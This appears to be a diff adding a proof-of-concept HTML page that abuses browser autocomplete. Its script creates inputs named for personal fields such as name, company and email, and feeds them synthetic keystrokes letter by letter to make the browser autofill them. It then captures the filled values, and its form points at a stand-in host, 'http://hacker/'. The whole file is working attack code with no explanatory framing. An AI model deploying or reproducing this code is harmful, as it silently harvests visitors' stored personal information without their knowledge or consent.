@@ -1,0 +1,92 @@
+&lt;html&gt;
+&lt;head&gt;
+
+&lt;script&gt;
+
+var iNames = [
+	&quot;name&quot;,
+	&quot;company&quot;,
+	&quot;city&quot;,
+	&quot;state&quot;,
+	&quot;country&quot;,
+	&quot;email&quot;,
+];
+
+function start() {
+	var str = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+	var chars = str.split(&quot;&quot;);	
+
+	var form = document.getElementById(&#039;mine&#039;);
+	var d = document.getElementById(&#039;data&#039;);
+
+	if (document.getElementById(&#039;iname&#039;)) {
+		form.removeChild(document.getElementById(&#039;iname&#039;));
+	}
+	
+	if (iNames.length &gt; 0) {
+		var input = document.createElement(&#039;input&#039;);
+		input.type = &quot;text&quot;;
+		input.name = iNames.shift();
+		input.id = &quot;iname&quot;;
+		form.appendChild(input);
+	
+		d.innerHTML += &quot;&lt;br&gt;&lt;b&gt;Searching&lt;/b&gt; \&quot;&quot; + input.name + &quot;\&quot;: &quot;;
+		mine(input, chars);
+	}
+		
+}
+
+function mine(input, charset) {
+	var d = document.getElementById(&#039;data&#039;);
+	var char = charset.shift();
+
+	var flag = 0;
+	
+	var event = document.createEvent(&#039;TextEvent&#039;);
+	event.initTextEvent(&#039;textInput&#039;, true, true, null, char);
+
+	input.value = &quot;&quot;;
+	input.selectionStart = 0;
+	input.selectionEnd = 0;
+	input.focus();
+	input.dispatchEvent(event);	
+	
+	setTimeout(function() {
+		if (input.value.length &gt; 1) {
+			d.innerHTML += input.value + &quot;&lt;br&gt;\n&quot;;
+			flag++;
+		}
+		if ((charset.length &gt; 0) &amp;&amp; (! flag)) {
+			mine(input, charset);
+		} else {
+			start();
+		}
+	}, 500);
+}
+
+&lt;/script&gt;
+
+&lt;style&gt;
+body {
+	font-size: 26px;
+}
+
+input {
+	font-size: 28px;
+	opacity: 1.0;
+}
+&lt;/style&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;form action=&quot;http://hacker/&quot; id=&quot;mine&quot;&gt;
+&lt;input type=&quot;button&quot; onclick=&quot;start();&quot; value=&quot;Start&quot;&gt;
+&lt;/form&gt;
+                
+
+&lt;div id=&quot;data&quot;&gt;&lt;/div&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
